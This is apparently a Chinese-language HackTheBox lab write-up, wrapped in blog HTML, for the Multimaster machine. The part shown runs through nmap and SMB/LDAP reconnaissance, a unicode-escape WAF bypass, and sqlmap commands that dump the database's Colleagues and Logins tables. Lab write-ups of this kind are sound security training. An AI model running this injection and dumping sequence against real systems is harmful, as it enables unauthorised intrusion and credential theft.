@@ -1,0 +1,1564 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  HTB Multimaster | Ya1orin
+</title>
+<meta name="description" content="HackTheBox篇Active Directory 101系列之Multimaster"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="HTB Multimaster | Ya1orin" />
+  <meta
+    property="og:description"
+    content="HackTheBox篇Active Directory 101系列之Multimaster"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/htb-multimaster/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2024-07-23T14:31:07&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-11T10:17:23&#43;08:00" /><meta property="article:tag" content="WindowsMSSQLCVE-2019-1414GenericWriteServer OperatorsSeBackupPrivilegeSeRestorePrivilege" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="HTB Multimaster"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">HTB Multimaster</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a>
+      <ul>
+        <li><a href="#nmap扫描">nmap扫描</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#rpc">rpc</a></li>
+        <li><a href="#ldap">ldap</a></li>
+        <li><a href="#http">http</a></li>
+      </ul>
+    </li>
+    <li><a href="#mssql注入">MSSQL注入</a>
+      <ul>
+        <li><a href="#sqlmap获取数据">sqlmap获取数据</a></li>
+        <li><a href="#hashcat破解密码">hashcat破解密码</a></li>
+        <li><a href="#密码喷洒">密码喷洒</a></li>
+      </ul>
+    </li>
+    <li><a href="#mssql-注入枚举域用户名">MSSQL 注入枚举域用户名</a>
+      <ul>
+        <li><a href="#攻击原理">攻击原理</a></li>
+        <li><a href="#获取默认域">获取默认域</a></li>
+        <li><a href="#获取域的-sid">获取域的 SID</a></li>
+        <li><a href="#枚举用户rid">枚举用户RID</a></li>
+        <li><a href="#二次密码喷洒登录tushikikatomo">二次密码喷洒登录tushikikatomo</a></li>
+      </ul>
+    </li>
+    <li><a href="#横向移动">横向移动</a>
+      <ul>
+        <li><a href="#bloodhound信息搜集">bloodhound信息搜集</a></li>
+        <li><a href="#cve-2019-1414登录cyork">CVE-2019-1414登录cyork</a></li>
+        <li><a href="#smb传输敏感文件">SMB传输敏感文件</a></li>
+        <li><a href="#逆向分析dll文件获取密码">逆向分析dll文件获取密码</a></li>
+        <li><a href="#三次密码喷洒登录sbauer">三次密码喷洒登录sbauer</a></li>
+        <li><a href="#bloodhound二次信息搜集">bloodhound二次信息搜集</a></li>
+        <li><a href="#滥用genericwrite权限横移登录jorden">滥用GenericWrite权限横移登录jorden</a></li>
+      </ul>
+    </li>
+    <li><a href="#ad域提权">AD域提权</a>
+      <ul>
+        <li><a href="#信息搜集">信息搜集</a></li>
+        <li><a href="#滥用server-operators组权限实现权限提升">滥用Server Operators组权限实现权限提升</a></li>
+      </ul>
+    </li>
+    <li><a href="#其他提权方法">其他提权方法</a>
+      <ul>
+        <li><a href="#sebackupprivilege和serestoreprivilege权限的滥用">SeBackupPrivilege和SeRestorePrivilege权限的滥用</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-07-23 14:31:07 &#43;0800 CST" itemprop="datePublished"
+      >2024-07-23</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-11</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/hackthebox"
+      data-aos="zoom-in"
+      >HACKTHEBOX</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><blockquote>
+<p>靶机ip：10.10.10.179</p>
+</blockquote>
+<h1 id="知识点">
+<a class="header-anchor" href="#%e7%9f%a5%e8%af%86%e7%82%b9"></a>
+知识点
+</h1><ul>
+<li>MSSQL注入</li>
+<li>MSSQL注入枚举域用户</li>
+<li>CVE-2019-1414</li>
+<li>滥用GenericWrite权限横向移动</li>
+<li>滥用Server Operators组权限实现权限提升</li>
+<li>SeBackupPrivilege和SeRestorePrivilege权限的滥用</li>
+</ul>
+<h1 id="信息收集">
+<a class="header-anchor" href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"></a>
+信息收集
+</h1><h2 id="nmap扫描">
+<a class="header-anchor" href="#nmap%e6%89%ab%e6%8f%8f"></a>
+nmap扫描
+</h2><p><code>nmap -sS -sV -sC -p- 10.10.10.179</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 15:15 CST
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.10.179
+</span></span><span class="line"><span class="cl">Host is up (0.42s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl">|_http-title: 403 - Forbidden: Access is denied.
+</span></span><span class="line"><span class="cl">| http-methods:
+</span></span><span class="line"><span class="cl">|_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-23 07:23:11Z)
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">3269/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl">|_ssl-date: 2024-07-23T07:24:51+00:00; +7m01s from scanner time.
+</span></span><span class="line"><span class="cl">| rdp-ntlm-info:
+</span></span><span class="line"><span class="cl">|   Target_Name: MEGACORP
+</span></span><span class="line"><span class="cl">|   NetBIOS_Domain_Name: MEGACORP
+</span></span><span class="line"><span class="cl">|   NetBIOS_Computer_Name: MULTIMASTER
+</span></span><span class="line"><span class="cl">|   DNS_Domain_Name: MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">|   DNS_Tree_Name: MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">|   Product_Version: 10.0.14393
+</span></span><span class="line"><span class="cl">|_  System_Time: 2024-07-23T07:24:12+00:00
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">| Not valid before: 2024-07-22T07:10:19
+</span></span><span class="line"><span class="cl">|_Not valid after:  2025-01-21T07:10:19
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49678/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49705/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49783/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb-os-discovery:
+</span></span><span class="line"><span class="cl">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+</span></span><span class="line"><span class="cl">|   Computer name: MULTIMASTER
+</span></span><span class="line"><span class="cl">|   NetBIOS computer name: MULTIMASTER\x00
+</span></span><span class="line"><span class="cl">|   Domain name: MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">|   Forest name: MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">|   FQDN: MULTIMASTER.MEGACORP.LOCAL
+</span></span><span class="line"><span class="cl">|_  System time: 2024-07-23T00:24:13-07:00
+</span></span><span class="line"><span class="cl">| smb-security-mode:
+</span></span><span class="line"><span class="cl">|   account_used: guest
+</span></span><span class="line"><span class="cl">|   authentication_level: user
+</span></span><span class="line"><span class="cl">|   challenge_response: supported
+</span></span><span class="line"><span class="cl">|_  message_signing: required
+</span></span><span class="line"><span class="cl">|_clock-skew: mean: 1h31m00s, deviation: 3h07m51s, median: 7m00s
+</span></span><span class="line"><span class="cl">| smb2-time:
+</span></span><span class="line"><span class="cl">|   date: 2024-07-23T07:24:16
+</span></span><span class="line"><span class="cl">|_  start_date: 2024-07-23T07:10:28
+</span></span><span class="line"><span class="cl">| smb2-security-mode:
+</span></span><span class="line"><span class="cl">|   3:1:1:
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 133.27 seconds
+</span></span></code></pre></div><p>发现有<code>DNS</code>服务、在<code>80</code>端口有<code>http</code>服务、<code>Kerberos</code>服务、<code>rpc</code>服务、<code>smb</code>服务、<code>ldap</code>服务以及<code>3389</code>端口的<code>rdp</code>服务，找到域名为<code>MEGACORP.LOCAL</code>，且主机为<code>Windows Server 2016</code></p>
+<h2 id="smb">
+<a class="header-anchor" href="#smb"></a>
+SMB
+</h2><p><code>smbclient -N -L //10.10.10.179</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723153459937-1324338121.png" alt="image-20240723153457969"></p>
+<p>没什么信息</p>
+<h2 id="rpc">
+<a class="header-anchor" href="#rpc"></a>
+rpc
+</h2><p><code>rpcclient -U &quot;&quot; 10.10.10.179</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723153807990-1882477100.png" alt="image-20240723153806072"></p>
+<p><code>rpc</code>不允许匿名访问</p>
+<h2 id="ldap">
+<a class="header-anchor" href="#ldap"></a>
+ldap
+</h2><p><code>ldapsearch -H ldap://10.10.10.179:389 -x -b &quot;DC=MEGACORP,DC=LOCAL&quot;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723154220389-36524757.png" alt="image-20240723154218048"></p>
+<p><code>ldap</code>也失败了，可能是身份验证出现了问题</p>
+<h2 id="http">
+<a class="header-anchor" href="#http"></a>
+http
+</h2><p>在<code>80</code> 端口运行着一个<code>web</code>服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723154341955-174699650.png" alt="image-20240723154339541"></p>
+<p>测试后发现几乎都点不了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723155009137-1563602452.png" alt="image-20240723155006560"></p>
+<p>在侧边栏点击<code>Colleague Finder</code>后，会有一个搜索框，什么数据都不输点击回车会显示一些人名等信息，仅此而已</p>
+<p>将用户保存下来，可能后面能用到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sbauer@megacorp.htb
+</span></span><span class="line"><span class="cl">okent@megacorp.htb
+</span></span><span class="line"><span class="cl">ckane@megacorp.htb
+</span></span><span class="line"><span class="cl">kpage@megacorp.htb
+</span></span><span class="line"><span class="cl">shayna@megacorp.htb
+</span></span><span class="line"><span class="cl">james@megacorp.htb
+</span></span><span class="line"><span class="cl">cyork@megacorp.htb
+</span></span><span class="line"><span class="cl">rmartin@megacorp.htb
+</span></span><span class="line"><span class="cl">zac@magacorp.htb
+</span></span><span class="line"><span class="cl">jorden@megacorp.htb
+</span></span><span class="line"><span class="cl">alyx@megacorp.htb
+</span></span><span class="line"><span class="cl">ilee@megacorp.htb
+</span></span><span class="line"><span class="cl">nbourne@megacorp.htb
+</span></span><span class="line"><span class="cl">zpowers@megacorp.htb
+</span></span><span class="line"><span class="cl">zpowers@megacorp.htb
+</span></span><span class="line"><span class="cl">minato@megacorp.htb
+</span></span><span class="line"><span class="cl">egre55@megacorp.htb
+</span></span></code></pre></div><p>在尝试拿<code>gobuster</code>扫描一下，看看是否有其他信息</p>
+<p><code>gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723164047789-118911268.png" alt="image-20240723164045428"></p>
+<p>结果发现有巨多的403，不太符合正常情况，猜测有waf存在</p>
+<p>这种搜索等功能可能会存在<code>sql</code>注入之类的洞，拿<code>burpsuit</code>抓个包看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723161658318-1989998677.png" alt="image-20240723161655843"></p>
+<p>参数为<code>'</code>试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723185010410-55567549.png" alt="image-20240723185008069"></p>
+<p>发现会报错，说明存在过滤，但是没有什么<code>waf</code>信息，尝试<code>fuzz</code>一下</p>
+<p><code>wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{&quot;name&quot;:&quot;FUZZ&quot;}' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723200250049-1678420648.png" alt="image-20240723200247938"></p>
+<p>发现返回包中设置的字符编码是<code>utf-8</code>，尝试一下其他编码能否绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240723201457071-400479735.png" alt="image-20240723201454802"></p>
+<p>测试后发现将<code>'</code>按照<code>unicode</code>编码后发现可以正常查询。绕过成功</p>
+<h1 id="mssql注入">
+<a class="header-anchor" href="#mssql%e6%b3%a8%e5%85%a5"></a>
+MSSQL注入
+</h1><h2 id="sqlmap获取数据">
+<a class="header-anchor" href="#sqlmap%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae"></a>
+sqlmap获取数据
+</h2><p>通过<code>unicode</code>编码可以绕过<code>waf</code>，就能正常注入了，这里直接拿<code>sqlmap</code>跑一下</p>
+<p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch</code></p>
+<blockquote>
+<p><code>--tamper=charunicodeescape</code>：将payload中的所有字符进行unicode编码</p>
+<p><code>--delay 5</code>： 延迟时间为5s，避免请求次数太快被ban</p>
+<p><code>--level 5 --risk 3</code>：使用更全面更复杂的payload</p>
+<p><code>--batch</code>：自动接受所有提示</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724141638815-1142390614.png" alt="image-20240724141634076"></p>
+<p>从上述结果中可以发现，该数据库是<code>SQL Server</code>并且<code>sqlmap</code>成功执行，继续找数据库名</p>
+<p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -dbs</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724142014523-1333297535.png" alt="image-20240724142006540"></p>
+<p>先查看<code>Hub_DB</code>数据库看看有哪些表</p>
+<p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -tables</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724143527309-1226900171.png" alt="image-20240724143522636"></p>
+<p>有两个表，直接查看一下表中的值</p>
+<ul>
+<li><code>Colleagues</code></li>
+</ul>
+<p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Colleagues --dump</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724143758776-409341571.png" alt="image-20240724143754224"></p>
+<p>这是一张同事表，存储着每个人的信息</p>
+<ul>
+<li><code>Logins</code></li>
+</ul>
+<p><code>python3 /usr/share/sqlmap/sqlmap.py -r post.txt --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch -D Hub_DB -T Logins --dump</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240724144019780-335466335.png" alt="image-20240724144015197"></p>
